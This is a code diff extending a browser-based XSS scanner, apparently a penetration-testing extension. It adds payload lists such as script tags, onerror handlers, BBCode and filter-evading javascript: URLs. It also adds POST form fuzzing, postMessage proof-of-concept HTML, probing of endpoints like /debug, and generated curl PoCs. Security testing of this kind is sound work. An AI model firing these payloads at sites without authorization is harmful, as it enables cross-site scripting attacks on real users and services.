@@ -617,15 +617,11 @@
     behavior.unicodeEncodes = detectedEncodings.has('unicode');
 
     // Check if dangerous patterns are stripped entirely
-    const dangerousPatterns = [
-      '<script', '</script>', 'javascript:', 'vbscript:', 'data:text/html',
-      'onerror', 'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur',
-      'expression(', '.innerHTML', 'document.cookie', 'document.write',
-      'eval(', 'alert(', 'prompt(', 'confirm(',
-    ];
-    behavior.stripsDangerous = dangerousPatterns.every(p =>
-      !htmlLower.includes(p) || baselineHtml.toLowerCase().includes(p)
-    );
+    // This is set to false by default - we can't determine stripping from the probe alone
+    // The probe sends '"\'<>/\`${} - it doesn't test <script> etc.
+    // stripsDangerous should only be true if we actually test dangerous payloads and they're removed
+    // For now, we DON'T assume stripping - if < and > aren't escaped, that's vulnerable
+    behavior.stripsDangerous = false;
 
     return behavior;
   }
@@ -838,31 +834,47 @@
   }
 
   function detectXSSByDiff(baseline, test, url, param, payload) {
-    // Check for NEW script tags
+    // Check for NEW script tags - must contain actual payload content, not just any alert/eval
     const newScripts = [...test.scriptTags].filter(s => !baseline.scriptTags.has(s));
     if (newScripts.length > 0) {
-      // Check for executable content in new scripts
       for (const script of newScripts) {
-        const execCheck = checkExecutableContext(script);
-        if (execCheck.isExecutable || script.length > 0) {
+        const scriptLower = script.toLowerCase();
+        const payloadLower = payload.toLowerCase();
+
+        // Script must contain our actual payload OR be very short with XSS patterns
+        // This prevents FPs from pages with dynamic scripts that happen to use alert/location
+        const containsPayload =
+          scriptLower.includes(payloadLower.substring(0, Math.min(20, payloadLower.length))) ||
+          (script.length < 100 && (scriptLower.includes('alert(1)') || scriptLower.includes('alert`1`')));
+
+        if (containsPayload) {
           return {
             type: 'script_injection',
-            description: `New script tag detected${execCheck.pattern ? ` with ${execCheck.pattern}` : ''}`,
+            description: `Injected script tag with payload content`,
           };
         }
       }
     }
 
-    // Check for NEW event handlers
+    // Check for NEW event handlers - but only if they contain XSS patterns from our payload
     const newHandlers = [...test.eventHandlers].filter(h => !baseline.eventHandlers.has(h));
     if (newHandlers.length > 0) {
-      // Extract handler value and check for executable patterns
-      const handlerValue = newHandlers[0].split('=')[1] || '';
-      const execCheck = checkExecutableContext(handlerValue);
-      return {
-        type: 'event_handler',
-        description: `New event handler detected: ${newHandlers[0]}${execCheck.pattern ? ` (${execCheck.pattern})` : ''}`,
-      };
+      for (const handler of newHandlers) {
+        const handlerValue = handler.split('=')[1] || '';
+        // Only report if handler contains executable code patterns likely from our payload
+        // This prevents FPs from pages that just have different UI for different param values
+        const xssPatterns = ['alert(', 'alert`', 'confirm(', 'prompt(', 'eval(', 'document.',
+                            'window.', 'location', 'cookie', 'onfocus', 'onerror', 'onload'];
+        const hasXSSPattern = xssPatterns.some(p => handlerValue.includes(p));
+
+        if (hasXSSPattern) {
+          const execCheck = checkExecutableContext(handlerValue);
+          return {
+            type: 'event_handler',
+            description: `New event handler with XSS pattern: ${handler}${execCheck.pattern ? ` (${execCheck.pattern})` : ''}`,
+          };
+        }
+      }
     }
 
     // Check for NEW javascript: iframes or data: iframes
@@ -1066,6 +1078,7 @@
 
       if (isVulnerable) {
         const payload = getExploitPayload(context);
+        const pocUrl = buildTestUrl(url, paramName, payload);
         return {
           type: 'REFLECTED_XSS',
           subtype: 'Proof-Based',
@@ -1075,6 +1088,7 @@
           severity: CONTEXT_SEVERITY[context],
           url: url,
           payload: payload,
+          pocUrl: pocUrl,
           proof: {
             canary: canary,
             reflectionFound: true,
@@ -1148,6 +1162,7 @@
             ];
 
             if (dangerous.some(d => d)) {
+              const pocUrl = buildTestUrl(url, paramName, payload);
               return {
                 type: 'JSONP_XSS',
                 subtype: 'Callback Injection',
@@ -1155,6 +1170,7 @@
                 severity: 'high',
                 url: url,
                 payload: payload,
+                pocUrl: pocUrl,
                 proof: {
                   callbackDetected: true,
                   response: exploitText.substring(0, 200),
@@ -1166,6 +1182,7 @@
         }
 
         // Even if payloads didn't work, report callback reflection as potential issue
+        const pocUrl = buildTestUrl(url, paramName, 'alert');
         return {
           type: 'JSONP_XSS',
           subtype: 'Callback Reflection',
@@ -1173,6 +1190,7 @@
           severity: 'medium',
           url: url,
           payload: testCallback,
+          pocUrl: pocUrl,
           proof: {
             callbackDetected: true,
             response: text.substring(0, 200),
@@ -1242,6 +1260,7 @@
             if ((testHtml.includes('alert(') && !baselineHtml.includes('alert(')) ||
                 (testHtml.includes('constructor') && !baselineHtml.includes('constructor')) ||
                 testHtml.match(/\[object\s+(Window|Object|Function)\]/)) {
+              const pocUrl = buildTestUrl(url, paramName, payload);
               return {
                 type: 'TEMPLATE_INJECTION',
                 subtype: 'Client-Side Template Injection',
@@ -1249,6 +1268,7 @@
                 severity: 'high',
                 url: url,
                 payload: payload,
+                pocUrl: pocUrl,
                 proof: {
                   templateEvaluated: true,
                   mathProbe: `${successfulProbe.template} → ${successfulProbe.result}`,
@@ -1260,6 +1280,7 @@
         }
 
         // Report template eval even without full XSS
+        const pocUrl = buildTestUrl(url, paramName, successfulProbe.template);
         return {
           type: 'TEMPLATE_INJECTION',
           subtype: 'Template Expression Evaluation',
@@ -1267,6 +1288,7 @@
           severity: 'medium',
           url: url,
           payload: successfulProbe.template,
+          pocUrl: pocUrl,
           proof: {
             templateEvaluated: true,
             evidence: `${successfulProbe.template} evaluated to ${successfulProbe.result}`,
@@ -1283,13 +1305,16 @@
         const es6Html = await es6Resp.text();
 
         if (es6Html.includes('1337') && !es6Html.includes('${191*7}')) {
+          const payload = '${alert(1)}';
+          const pocUrl = buildTestUrl(url, paramName, payload);
           return {
             type: 'TEMPLATE_INJECTION',
             subtype: 'ES6 Template Literal Injection',
             parameter: paramName,
             severity: 'high',
             url: url,
-            payload: '${alert(1)}',
+            payload: payload,
+            pocUrl: pocUrl,
             proof: {
               templateEvaluated: true,
               evidence: '${191*7} evaluated to 1337',
@@ -1304,6 +1329,127 @@
       console.error(`[XSS Scanner] Template test error:`, error);
       return null;
     }
+  }
+
+  /**
+   * Test for BBCode javascript: URL injection
+   * BBCode parsers may allow javascript: in [url] tags
+   */
+  async function testBBCodeInjection(url, paramName) {
+    // Only test parameters that might contain BBCode
+    const bbcodeParams = ['code', 'bbcode', 'content', 'text', 'message', 'body', 'post'];
+    if (!bbcodeParams.includes(paramName.toLowerCase())) return null;
+
+    const bbcodePayloads = [
+      '[url=javascript:alert(1)]click[/url]',
+      '[url]javascript:alert(1)[/url]',
+      '[img]javascript:alert(1)[/img]',
+      '[url=javascript:alert`1`]x[/url]',
+      '[link=javascript:alert(1)]x[/link]',
+      '[a href="javascript:alert(1)"]x[/a]',
+    ];
+
+    try {
+      for (const payload of bbcodePayloads) {
+        const testUrl = buildTestUrl(url, paramName, payload);
+        const resp = await fetch(testUrl, { credentials: 'include' });
+        const html = await resp.text();
+
+        // Check if javascript: URL made it through to href attribute
+        // Must verify our payload is actually in the href, not just any existing javascript: link
+        const jsHrefPatterns = [
+          /href\s*=\s*"javascript:[^"]*alert\s*[(`]/i,
+          /href\s*=\s*'javascript:[^']*alert\s*[(`]/i,
+          /href\s*=\s*javascript:[^\s>]*alert/i,
+        ];
+
+        const hasInjectedJsHref = jsHrefPatterns.some(p => p.test(html));
+
+        if (hasInjectedJsHref) {
+          const pocUrl = buildTestUrl(url, paramName, payload);
+          return {
+            type: 'BBCODE_XSS',
+            subtype: 'BBCode JavaScript URL Injection',
+            parameter: paramName,
+            severity: 'high',
+            url: url,
+            payload: payload,
+            pocUrl: pocUrl,
+            proof: {
+              javascriptUrlInHref: true,
+            },
+            explanation: 'BBCode parser allows javascript: URLs in link attributes.',
+          };
+        }
+      }
+    } catch {}
+    return null;
+  }
+
+  /**
+   * Test POST forms for XSS by submitting payloads
+   */
+  async function testPOSTFormXSS(formAction, formInputs, baseUrl) {
+    const results = [];
+    const xssPayloads = [
+      '<script>alert(1)</script>',
+      '<img src=x onerror=alert(1)>',
+      '<svg onload=alert(1)>',
+      '"><script>alert(1)</script>',
+      "'-alert(1)-'",
+    ];
+
+    for (const input of formInputs) {
+      if (input.type === 'hidden' || input.type === 'submit') continue;
+
+      for (const payload of xssPayloads) {
+        try {
+          // Build form data with payload in target field
+          const formData = new FormData();
+          for (const field of formInputs) {
+            if (field.name === input.name) {
+              formData.append(field.name, payload);
+            } else if (field.value) {
+              formData.append(field.name, field.value);
+            } else {
+              formData.append(field.name, 'test');
+            }
+          }
+
+          const resp = await fetch(formAction || baseUrl, {
+            method: 'POST',
+            body: formData,
+            credentials: 'include',
+          });
+          const html = await resp.text();
+
+          // Check if payload reflected unescaped
+          if (html.includes(payload) ||
+              (html.includes('<script>alert(1)') && payload.includes('<script>')) ||
+              (html.includes('onerror=alert(1)') && payload.includes('onerror'))) {
+            results.push({
+              type: 'REFLECTED_XSS',
+              subtype: 'POST Form Injection',
+              parameter: input.name,
+              formAction: formAction,
+              severity: 'high',
+              url: baseUrl,
+              payload: payload,
+              pocUrl: `${formAction || baseUrl} [POST ${input.name}=${encodeURIComponent(payload)}]`,
+              curlPoc: `curl -X POST "${formAction || baseUrl}" -d "${input.name}=${encodeURIComponent(payload)}"`,
+              proof: {
+                formMethod: 'POST',
+                inputName: input.name,
+                payloadUsed: payload,
+              },
+              explanation: `POST form field "${input.name}" reflects XSS payload unescaped.`,
+            });
+            break; // Found XSS for this input, move to next
+          }
+        } catch {}
+      }
+    }
+    return results;
   }
 
   async function differentialFuzz(url, paramName) {
@@ -1340,6 +1486,7 @@
           const diff = detectXSSByDiff(baselineDom, testDom, url, paramName, result.payload);
 
           if (diff) {
+            const pocUrl = buildTestUrl(url, paramName, result.payload);
             return {
               type: 'REFLECTED_XSS',
               subtype: 'Differential',
@@ -1347,6 +1494,7 @@
               severity: 'high',
               url: url,
               payload: result.payload,
+              pocUrl: pocUrl,
               proof: {
                 diffType: diff.type,
                 description: diff.description,
@@ -1424,14 +1572,26 @@
     console.log('[XSS Scanner] Phase 1: DOM XSS Analysis');
     const domVulns = analyzeDOM_XSS();
     for (const vuln of domVulns) {
+      // Build POC URL based on source type
+      let pocUrl = location.href;
+      if (vuln.source === 'location.hash') {
+        pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
+      } else if (vuln.source === 'location.search') {
+        const testUrl = new URL(location.href);
+        testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
+        pocUrl = testUrl.toString();
+      }
+
       const finding = {
         type: 'DOM_XSS',
         severity: 'high',
         url: location.href,
+        pocUrl: pocUrl,
         source: vuln.source,
         sink: vuln.sinkName,
         evidence: vuln.evidence,
         code: vuln.code,
+        payload: '<img src=x onerror=alert(1)>',
         explanation: `Tainted data from ${vuln.source} flows to dangerous sink ${vuln.sinkName}`,
       };
       results.push(finding);
@@ -1715,6 +1875,7 @@
   }
 
   function checkHashXSS(hash) {
+    // Check for suspicious patterns in current hash
     const xssPatterns = [
       { regex: /<script/i, desc: 'Script tag in hash' },
       { regex: /javascript:/i, desc: 'JavaScript URL in hash' },
@@ -1730,6 +1891,8 @@
           type: 'DOM_XSS_POTENTIAL',
           severity: 'high',
           url: location.href,
+          pocUrl: location.href, // Already contains the malicious hash
+          payload: hash,
           source: 'location.hash',
           evidence: desc,
           value: hash.substring(0, 200),
@@ -1739,6 +1902,243 @@
         reportFinding(finding);
       }
     }
+  }
+
+  /**
+   * Test if hash fragment is reflected into DOM unsafely
+   * Analyzes page scripts for DOM sinks using location.hash
+   */
+  async function testHashFragmentXSS(url) {
+    const results = [];
+
+    try {
+      // Fetch the page and analyze its scripts for hash-based DOM XSS patterns
+      const resp = await fetch(url, { credentials: 'include' });
+      const html = await resp.text();
+
+      // Extract all script content
+      const scriptMatches = html.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
+      const allJS = scriptMatches.map(s => s.replace(/<\/?script[^>]*>/gi, '')).join('\n');
+
+      // Dangerous patterns: location.hash flowing to DOM sinks
+      const hashSinkPatterns = [
+        { regex: /\.innerHTML\s*=\s*[^;]*location\.hash/gi, sink: 'innerHTML' },
+        { regex: /\.outerHTML\s*=\s*[^;]*location\.hash/gi, sink: 'outerHTML' },
+        { regex: /document\.write\s*\([^)]*location\.hash/gi, sink: 'document.write' },
+        { regex: /\$\([^)]*\)\.html\s*\([^)]*location\.hash/gi, sink: 'jQuery.html' },
+        { regex: /\.append\s*\([^)]*location\.hash/gi, sink: 'append' },
+        { regex: /\.prepend\s*\([^)]*location\.hash/gi, sink: 'prepend' },
+        { regex: /eval\s*\([^)]*location\.hash/gi, sink: 'eval' },
+        { regex: /setTimeout\s*\([^)]*location\.hash/gi, sink: 'setTimeout' },
+        { regex: /setInterval\s*\([^)]*location\.hash/gi, sink: 'setInterval' },
+        { regex: /new\s+Function\s*\([^)]*location\.hash/gi, sink: 'Function constructor' },
+      ];
+
+      for (const { regex, sink } of hashSinkPatterns) {
+        if (regex.test(allJS)) {
+          const payload = '<img/onerror=alert(1)src=x>';
+          const pocUrl = url.split('#')[0] + '#' + payload;
+          results.push({
+            type: 'DOM_XSS',
+            subtype: 'Hash Fragment to Sink',
+            source: 'location.hash',
+            sink: sink,
+            severity: 'high',
+            url: url,
+            pocUrl: pocUrl,
+            payload: payload,
+            proof: {
+              patternFound: `location.hash → ${sink}`,
+            },
+            explanation: `location.hash flows to ${sink} without sanitization.`,
+          });
+          break; // One finding per page is enough
+        }
+      }
+
+      // Also check for indirect hash usage via variables
+      const hashVarPatterns = [
+        /(?:let|const|var)\s+(\w+)\s*=\s*location\.hash/gi,
+        /(?:let|const|var)\s+(\w+)\s*=\s*window\.location\.hash/gi,
+      ];
+
+      for (const pattern of hashVarPatterns) {
+        const matches = [...allJS.matchAll(pattern)];
+        for (const match of matches) {
+          const varName = match[1];
+          // Check if this variable flows to a dangerous sink
+          const varToSinkRegex = new RegExp(`\\.innerHTML\\s*=\\s*[^;]*${varName}`, 'gi');
+          if (varToSinkRegex.test(allJS)) {
+            const payload = '<img/onerror=alert(1)src=x>';
+            const pocUrl = url.split('#')[0] + '#' + payload;
+            results.push({
+              type: 'DOM_XSS',
+              subtype: 'Hash Fragment via Variable',
+              source: 'location.hash',
+              sink: 'innerHTML',
+              severity: 'high',
+              url: url,
+              pocUrl: pocUrl,
+              payload: payload,
+              proof: {
+                variable: varName,
+                flow: `location.hash → ${varName} → innerHTML`,
+              },
+              explanation: `location.hash stored in "${varName}" flows to innerHTML.`,
+            });
+            break;
+          }
+        }
+      }
+    } catch (e) {
+      console.log('[XSS Scanner] Hash fragment test error:', e.message);
+    }
+
+    return results;
+  }
+
+  /**
+   * Test for javascript: URL acceptance in redirect parameters
+   */
+  async function testJavaScriptURLRedirect(url, paramName) {
+    const jsPayloads = [
+      'javascript:alert(1)',
+      'javascript:alert`1`',
+      'javascript://comment%0aalert(1)',
+      'jAvAsCrIpT:alert(1)',
+      'java\tscript:alert(1)',
+      'java\nscript:alert(1)',
+      '\x00javascript:alert(1)',
+    ];
+
+    for (const payload of jsPayloads) {
+      try {
+        const testUrl = buildTestUrl(url, paramName, payload);
+        const resp = await fetch(testUrl, { credentials: 'include', redirect: 'manual' });
+
+        // Check if redirect location contains javascript:
+        const redirectLocation = resp.headers.get('location');
+        if (redirectLocation && redirectLocation.toLowerCase().includes('javascript:')) {
+          const pocUrl = buildTestUrl(url, paramName, payload);
+          return {
+            type: 'OPEN_REDIRECT_XSS',
+            subtype: 'JavaScript URL Redirect',
+            parameter: paramName,
+            severity: 'high',
+            url: url,
+            payload: payload,
+            pocUrl: pocUrl,
+            proof: {
+              redirectLocation: redirectLocation,
+            },
+            explanation: 'Redirect parameter accepts javascript: URLs, enabling XSS via redirect.',
+          };
+        }
+
+        // Also check if it's reflected in a meta refresh or JS redirect
+        if (resp.ok) {
+          const html = await resp.text();
+          const lowerHtml = html.toLowerCase();
+
+          // Check for javascript: in various reflection points
+          if (lowerHtml.includes('javascript:alert')) {
+            // Check context
+            if (lowerHtml.includes('href="javascript:') ||
+                lowerHtml.includes("href='javascript:") ||
+                lowerHtml.includes('url=javascript:') ||
+                lowerHtml.includes('location=javascript:') ||
+                lowerHtml.includes('window.location') && lowerHtml.includes('javascript:')) {
+              const pocUrl = buildTestUrl(url, paramName, payload);
+              return {
+                type: 'OPEN_REDIRECT_XSS',
+                subtype: 'JavaScript URL Reflection',
+                parameter: paramName,
+                severity: 'high',
+                url: url,
+                payload: payload,
+                pocUrl: pocUrl,
+                proof: {
+                  reflectedIn: 'URL attribute or redirect',
+                },
+                explanation: 'javascript: URL is reflected in a URL context, enabling XSS.',
+              };
+            }
+          }
+        }
+      } catch {}
+    }
+
+    return null;
+  }
+
+  /**
+   * Test for PostMessage XSS (missing origin validation)
+   */
+  async function testPostMessageXSS(url) {
+    const results = [];
+
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      await new Promise((resolve, reject) => {
+        iframe.onload = resolve;
+        iframe.onerror = reject;
+        iframe.src = url;
+        setTimeout(reject, 5000);
+      });
+
+      // Check if page has message event listeners
+      const iframeWindow = iframe.contentWindow;
+      if (iframeWindow) {
+        // Try to find message handlers in the page's scripts
+        const iframeDoc = iframe.contentDocument || iframeWindow.document;
+        const scripts = iframeDoc?.querySelectorAll('script') || [];
+
+        for (const script of scripts) {
+          const content = script.textContent || '';
+          if (content.includes('addEventListener') && content.includes('message')) {
+            // Check if it validates origin
+            const noOriginCheck = !content.includes('event.origin') && !content.includes('e.origin') &&
+                !content.includes('.origin ===') && !content.includes('.origin ==');
+
+            // Check for dangerous sinks
+            const dangerousSinks = ['innerHTML', 'outerHTML', 'document.write', 'eval', '.html('];
+            for (const sink of dangerousSinks) {
+              if (content.includes(sink)) {
+                const payload = '<img src=x onerror=alert(1)>';
+                results.push({
+                  type: 'POSTMESSAGE_XSS',
+                  subtype: 'Missing Origin Validation',
+                  severity: noOriginCheck ? 'high' : 'medium',
+                  url: url,
+                  payload: payload,
+                  pocUrl: url,
+                  pocHtml: `<iframe src="${url}" onload="this.contentWindow.postMessage('${payload}','*')"></iframe>`,
+                  sink: sink,
+                  proof: {
+                    hasMessageHandler: true,
+                    checksOrigin: !noOriginCheck,
+                    dangerousSink: sink,
+                  },
+                  explanation: noOriginCheck
+                    ? `postMessage handler uses ${sink} without origin validation. XSS via cross-origin message.`
+                    : `postMessage handler uses ${sink}. Origin validation may be bypassable.`,
+                });
+                break;
+              }
+            }
+          }
+        }
+      }
+
+      document.body.removeChild(iframe);
+    } catch (e) {
+      console.log('[XSS Scanner] PostMessage test error:', e.message);
+    }
+
+    return results;
   }
 
   // ============================================
@@ -2009,40 +2409,74 @@
       }
     } catch {}
 
+    // URL-like parameter names that should be tested for javascript: URL injection
+    const urlParamNames = ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest', 'target',
+                           'link', 'redir', 'from', 'ref', 'src', 'href', 'uri', 'path', 'callback'];
+
     // Test existing URL parameters
     for (const param of params) {
-      if (testedParams.has(`${path}:${param}`)) continue;
-      testedParams.add(`${path}:${param}`);
+      const paramName = typeof param === 'object' ? param.name : param;
+      if (testedParams.has(`${path}:${paramName}`)) continue;
+      testedParams.add(`${path}:${paramName}`);
 
-      console.log(`[XSS Scanner] Testing ${path}?${param}=...`);
-      const vuln = await testParameterFull(url, param, 'test');
+      console.log(`[XSS Scanner] Testing ${path}?${paramName}=...`);
+      const vuln = await testParameterFull(url, paramName, 'test');
       if (vuln) {
         vuln.crawledPath = path;
         results.push(vuln);
         reportFinding(vuln);
       }
+
+      // Test URL-like params for javascript: URL injection
+      if (urlParamNames.includes(paramName.toLowerCase())) {
+        const jsVuln = await testJavaScriptURLRedirect(url, paramName);
+        if (jsVuln) {
+          jsVuln.crawledPath = path;
+          results.push(jsVuln);
+          reportFinding(jsVuln);
+        }
+      }
+
+      // Test BBCode-like params for javascript: URL in BBCode
+      const bbVuln = await testBBCodeInjection(url, paramName);
+      if (bbVuln) {
+        bbVuln.crawledPath = path;
+        results.push(bbVuln);
+        reportFinding(bbVuln);
+      }
     }
 
     // Test form inputs found on the page
-    for (const input of formInputs) {
+    const postFormInputs = formInputs.filter(f => f.formMethod === 'POST');
+    const getFormInputs = formInputs.filter(f => f.formMethod === 'GET');
+
+    // Test GET form inputs
+    for (const input of getFormInputs) {
       if (testedParams.has(`${path}:${input.name}`)) continue;
       testedParams.add(`${path}:${input.name}`);
 
       console.log(`[XSS Scanner] Testing form input: ${input.name} (${input.formMethod})`);
 
-      if (input.formMethod === 'GET') {
-        // Test as URL parameter
-        const testUrl = new URL(url);
-        testUrl.searchParams.set(input.name, 'FORMTEST');
-        const vuln = await testParameterFull(testUrl.toString(), input.name, 'FORMTEST');
-        if (vuln) {
-          vuln.crawledPath = path;
-          vuln.fromForm = true;
-          results.push(vuln);
-          reportFinding(vuln);
-        }
+      const testUrl = new URL(url);
+      testUrl.searchParams.set(input.name, 'FORMTEST');
+      const vuln = await testParameterFull(testUrl.toString(), input.name, 'FORMTEST');
+      if (vuln) {
+        vuln.crawledPath = path;
+        vuln.fromForm = true;
+        results.push(vuln);
+        reportFinding(vuln);
       }
-      // POST forms are handled separately in scanFormsForXSS
+    }
+
+    // Test POST form inputs with actual payload submission
+    if (postFormInputs.length > 0) {
+      console.log(`[XSS Scanner] Testing ${postFormInputs.length} POST form inputs on ${path}`);
+      const postVulns = await testPOSTFormXSS(endpoint.formAction || url, postFormInputs, url);
+      for (const vuln of postVulns) {
+        vuln.crawledPath = path;
+        results.push(vuln);
+        reportFinding(vuln);
+      }
     }
 
     // Probe with FULL COMMON_PARAMS list (not just quick list)
@@ -2179,14 +2613,35 @@
     }
 
     // Phase 1.5: Probe for common API endpoints that might not be linked
-    console.log('[XSS Scanner] Phase 1.5: Probing common API endpoints...');
+    console.log('[XSS Scanner] Phase 1.5: Probing common API/XSS endpoints...');
     const basePath = new URL(location.href).pathname.replace(/\/[^/]*$/, '') || '';
+
+    // Common API paths
     const apiPaths = [
       '/api/stats', '/api/user', '/api/data', '/api/search', '/api/config',
       '/api/callback', '/api/jsonp', '/api/v1/stats', '/api/v1/user',
       `${basePath}/api/stats`, `${basePath}/api/data`,
       '/feed.xml', '/rss.xml', '/sitemap.xml',
       `${basePath}/feed.xml`, `${basePath}/stats`,
+    ];
+
+    // Common XSS-prone endpoints with their typical parameters
+    const xssPaths = [
+      { path: `${basePath}/error`, params: ['from', 'msg', 'message', 'error', 'redirect', 'url', 'return'] },
+      { path: `${basePath}/embed`, params: ['title', 'url', 'src', 'content', 'html'] },
+      { path: `${basePath}/print`, params: ['header', 'title', 'footer', 'content', 'id'] },
+      { path: `${basePath}/share`, params: ['title', 'url', 'text', 'description'] },
+      { path: `${basePath}/postmessage`, params: [] }, // PostMessage XSS - no params needed
+      { path: `${basePath}/redirect`, params: ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest'] },
+      { path: `${basePath}/callback`, params: ['callback', 'cb', 'jsonp', 'func'] },
+      { path: `${basePath}/download`, params: ['file', 'name', 'filename'] },
+      { path: `${basePath}/export`, params: ['format', 'filename', 'title'] },
+      { path: `${basePath}/debug`, params: ['cmd', 'exec', 'code', 'eval'] },
+      { path: `${basePath}/log`, params: ['msg', 'message', 'data', 'event'] },
+      { path: `${basePath}/upload`, params: ['name', 'filename', 'title'] },
+      { path: `${basePath}/avatar`, params: ['url', 'src', 'image'] },
+      { path: `${basePath}/import`, params: ['url', 'data', 'source'] },
+      { path: `${basePath}/contact`, params: ['name', 'email', 'subject', 'message'] },
     ];
 
     for (const apiPath of apiPaths) {
@@ -2212,7 +2667,34 @@
       } catch {}
     }
 
-    console.log(`[XSS Scanner] Found ${discovered.size} unique endpoints to test (crawled + intercepted + api-probed)`);
+    // Probe XSS-prone endpoints with their typical parameters
+    for (const { path: xssPath, params: xssParams } of xssPaths) {
+      if (discovered.has(xssPath)) continue;
+
+      try {
+        const testUrl = new URL(xssPath, origin);
+        const resp = await fetch(testUrl.toString(), { credentials: 'include', method: 'HEAD' });
+
+        if (resp.ok || resp.status === 405) {
+          // Build URL with test parameters for reflection testing
+          const urlWithParams = new URL(xssPath, origin);
+          xssParams.forEach(p => urlWithParams.searchParams.set(p, 'test'));
+
+          discovered.set(xssPath, {
+            url: urlWithParams.toString(),
+            path: xssPath,
+            params: xssParams.map(p => ({ name: p, value: 'test' })),
+            formInputs: [],
+            formParams: [],
+            depth: 0,
+            source: 'xss-probe',
+          });
+          console.log(`[XSS Scanner] Found XSS endpoint: ${xssPath} (params: ${xssParams.join(', ')})`);
+        }
+      } catch {}
+    }
+
+    console.log(`[XSS Scanner] Found ${discovered.size} unique endpoints to test (crawled + intercepted + probed)`);
 
     // Phase 2: Test each endpoint
     console.log('[XSS Scanner] Phase 2: Testing discovered endpoints...');
@@ -2229,14 +2711,26 @@
     console.log('[XSS Scanner] Phase 3: DOM XSS analysis...');
     const domVulns = analyzeDOM_XSS();
     for (const vuln of domVulns) {
+      // Build POC URL based on source type
+      let pocUrl = location.href;
+      if (vuln.source === 'location.hash') {
+        pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
+      } else if (vuln.source === 'location.search') {
+        const testUrl = new URL(location.href);
+        testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
+        pocUrl = testUrl.toString();
+      }
+
       const finding = {
         type: 'DOM_XSS',
         severity: 'high',
         url: location.href,
+        pocUrl: pocUrl,
         source: vuln.source,
         sink: vuln.sinkName,
         evidence: vuln.evidence,
         code: vuln.code,
+        payload: '<img src=x onerror=alert(1)>',
         explanation: `Tainted data from ${vuln.source} flows to dangerous sink ${vuln.sinkName}`,
       };
       allResults.push(finding);
@@ -2246,6 +2740,57 @@
     // Phase 4: Hash-based XSS check on current page
     if (location.hash) {
       checkHashXSS(location.hash);
+    }
+
+    // Phase 5: Active hash fragment XSS testing
+    console.log('[XSS Scanner] Phase 5: Hash fragment reflection testing...');
+    try {
+      const hashResults = await testHashFragmentXSS(location.href);
+      for (const vuln of hashResults) {
+        allResults.push(vuln);
+        reportFinding(vuln);
+      }
+    } catch (e) {
+      console.log('[XSS Scanner] Hash fragment test error:', e.message);
+    }
+
+    // Phase 6: PostMessage XSS testing on discovered endpoints
+    console.log('[XSS Scanner] Phase 6: PostMessage XSS testing...');
+    const postMessageEndpoints = [...discovered.values()].filter(e =>
+      e.path.includes('postmessage') || e.path.includes('message') || e.path.includes('widget')
+    );
+    for (const endpoint of postMessageEndpoints) {
+      try {
+        const pmResults = await testPostMessageXSS(endpoint.url);
+        for (const vuln of pmResults) {
+          allResults.push(vuln);
+          reportFinding(vuln);
+        }
+      } catch (e) {
+        console.log('[XSS Scanner] PostMessage test error:', e.message);
+      }
+    }
+
+    // Phase 7: JavaScript URL redirect testing
+    console.log('[XSS Scanner] Phase 7: JavaScript URL redirect testing...');
+    const redirectEndpoints = [...discovered.values()].filter(e =>
+      e.path.includes('redirect') || e.path.includes('goto') || e.path.includes('return') ||
+      e.path.includes('next') || e.path.includes('url') || e.path.includes('callback')
+    );
+    for (const endpoint of redirectEndpoints) {
+      const redirectParams = ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest', 'target', 'link', 'redir'];
+      for (const param of redirectParams) {
+        if (testedParams.has(`${endpoint.path}:${param}:jsurl`)) continue;
+        testedParams.add(`${endpoint.path}:${param}:jsurl`);
+
+        try {
+          const jsResult = await testJavaScriptURLRedirect(endpoint.url, param);
+          if (jsResult) {
+            allResults.push(jsResult);
+            reportFinding(jsResult);
+          }
+        } catch {}
+      }
     }
 
     // Count sources
@@ -2347,7 +2892,46 @@
     return explanations[context] || `Vulnerable ${contextName} context. Unescaped chars: ${unesc}`;
   }
 
+  // Track reported findings to avoid duplicates
+  const reportedFindings = new Set();
+
+  /**
+   * Generate a unique key for a finding to detect duplicates.
+   * Normalizes URLs by removing variable parts like IDs.
+   */
+  function getFindingKey(finding) {
+    // Normalize URL: replace numeric IDs with placeholder
+    let normalizedUrl = (finding.url || '').replace(/[?&](\w+)=\d+/g, '?$1=<ID>');
+    normalizedUrl = normalizedUrl.replace(/\/\d+($|[?#])/g, '/<ID>$1');
+
+    // Key components
+    const type = finding.type || '';
+    const subtype = finding.subtype || '';
+    const param = finding.parameter || finding.source || '';
+    const context = finding.context || '';
+    const sink = finding.sink || '';
+
+    // Extract path pattern (endpoint) without query params
+    let pathPattern = '';
+    try {
+      const urlObj = new URL(normalizedUrl);
+      pathPattern = urlObj.pathname;
+    } catch {
+      pathPattern = normalizedUrl.split('?')[0];
+    }
+
+    return `${type}|${subtype}|${pathPattern}|${param}|${context}|${sink}`;
+  }
+
   function reportFinding(finding) {
+    // Check for duplicates
+    const key = getFindingKey(finding);
+    if (reportedFindings.has(key)) {
+      console.log(`[XSS Scanner] Skipping duplicate: ${finding.type} on ${finding.parameter || finding.source}`);
+      return;
+    }
+    reportedFindings.add(key);
+
     window.postMessage({
       type: '__lonkero_xss_finding__',
       finding: finding,
@@ -2381,7 +2965,24 @@
       // DOM XSS
       const domVulns = analyzeDOM_XSS();
       for (const v of domVulns) {
-        const finding = { ...v, type: 'DOM_XSS', severity: 'high' };
+        // Build POC URL based on source type
+        let pocUrl = location.href;
+        if (v.source === 'location.hash') {
+          pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
+        } else if (v.source === 'location.search') {
+          const testUrl = new URL(location.href);
+          testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
+          pocUrl = testUrl.toString();
+        }
+
+        const finding = {
+          ...v,
+          type: 'DOM_XSS',
+          severity: 'high',
+          url: location.href,
+          pocUrl: pocUrl,
+          payload: '<img src=x onerror=alert(1)>',
+        };
         results.push(finding);
         reportFinding(finding);
       }
@@ -2470,10 +3071,12 @@
     }
   });
 
